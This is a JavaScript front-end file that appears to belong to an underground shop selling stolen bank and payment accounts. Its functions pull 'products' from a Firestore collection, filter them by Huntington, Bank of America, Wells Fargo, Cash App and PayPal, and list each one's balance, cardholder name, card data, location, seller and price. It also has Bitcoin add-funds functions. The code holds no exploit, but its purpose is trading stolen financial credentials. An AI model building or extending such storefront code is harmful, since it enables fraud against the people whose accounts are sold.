            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop == 'huntington.com') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{
                console.log('Nothing to show huntington');
            }
        });
    });
}
function GET_BOA_PRODUCTS(){
    CLOSE_GOD_PAYMENT();
    $('.paginatorr').removeClass('hide');
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    $('.FLASH_ACCOUNTS').addClass('hide');
    firebase.firestore().collection("PRODUCTS").where("shop", "==", "bankofamerica.com").limit(6).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop == 'bankofamerica.com') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{

            }
        });
    });
}
function GET_OTHER_PRODUCTS(){
    CLOSE_GOD_PAYMENT();
    $('.paginatorr').removeClass('hide');
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    $('.FLASH_ACCOUNTS').addClass('hide');
    firebase.firestore().collection("PRODUCTS").limit(6).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop != 'bankofamerica.com' && doc.data().shop != 'huntington.com' && doc.data().shop != 'wellsfargo.com' && doc.data().shop != 'cash.app' && doc.data().shop != 'paypal.com') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{
                
            }
        });
    });
}
function GET_MORE_BANKS(){
    CLOSE_GOD_PAYMENT();
    $('.paginatorr').removeClass('hide');
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    $('.FLASH_ACCOUNTS').addClass('hide');
    firebase.firestore().collection("PRODUCTS").where("shop", "!=", "huntington.com", "shop", "!=", "paypal.com").limit(6).get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (doc.data().shop != '') {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{  
                console.log('Nothing to show huntington');
            }
        });
    });
}
//SEPTEMBER 08 2021
function GET_ALL_PRODUCTS(){
    CLOSE_GOD_PAYMENT();
    $('.FLASH_ACCOUNTS').addClass('hide');
    var shop,balance,points,name,type
            ,country_state_zip,cc,bank,info
            ,last_order,mail_domain,uploaded,seller,price;
    //var shop = x.toLowerCase();
    $('#products_table_bx tr').remove();
    firebase.firestore().collection("PRODUCTS").get().then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());

            
            shop = doc.data().shop;
            balance = doc.data().balance;
            points = doc.data().points;

            name = doc.data().name;
            type = doc.data().type;
            country_state_zip = doc.data().country_state_zip;
            cc = doc.data().cc;
            bank = doc.data().bank;
            info = doc.data().info;
            last_order = doc.data().last_order;

            mail_domain = doc.data().mail_domain;
            uploaded = doc.data().uploaded;
            seller = doc.data().seller;
            price = doc.data().price;

            if (1==1) {
                APPEND_PRODUCTS(doc.id,shop,balance,points,name,type,country_state_zip,cc,bank,info,last_order,mail_domain,uploaded,seller,price);
            }else{

            }
        });
    });
}
function GET_PRODUCTS(x){
    $('.paginatorr').removeClass('hide');
    var shop = x.toLowerCase();
    firebase.firestore().collection("PRODUCTS").where("shop", "==", x)
    .get()
    .then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());
            user = doc.data().shop;
            
            
            
        });
    })
    .catch((error) => {
        console.log("Error getting documents: ", error);
    });
}
function ADD_PRODUCTS(x){
    firebase.firestore().collection("accounts").add({
        username: z,
        password: x,
        balance: '0.00',
        date: 1
    })
    .then((docRef) => {
        console.log("Document written with ID: ", docRef.id);
        $('#LOGIN_PAGE').removeClass('hide');
        $('.pp').text('Your account has been created successfully. Login with your username and password.');
        $('.pp').addClass('green-text');
    })
    .catch((error) => {
        console.error("Error adding document: ", error);
        alert('Failed to register user. Try again later');
    });
} 
//SEPTEMBER 10 2021
function GET_WELLS_FARGO(){

}
function add_funds_exc(){
    $('.exceptions_hide ').addClass('hide');
    $('.exceptions_show').removeClass('hide');
}
function openBTCPAYMENT(){
    //$('.BLOCKCHAIN-PAYMENT').removeClass('hide');
    $('.blockchain_pay').removeClass('hide');
}
function openAddFunds(){
    openBTCPAYMENT();
    $('.exceptions_hide ').addClass('hide');
    $('.exceptions_show').removeClass('hide');
    $('.product_price').text('$100');
    var priceQ= '$0';
    var RemoveFirstCharSub = priceQ.substring(1);
    $('#btcpay-input-price').val(parseInt(RemoveFirstCharSub));
    $('.btcOrderId').val(THIS_ACCOUNT_ID);
}
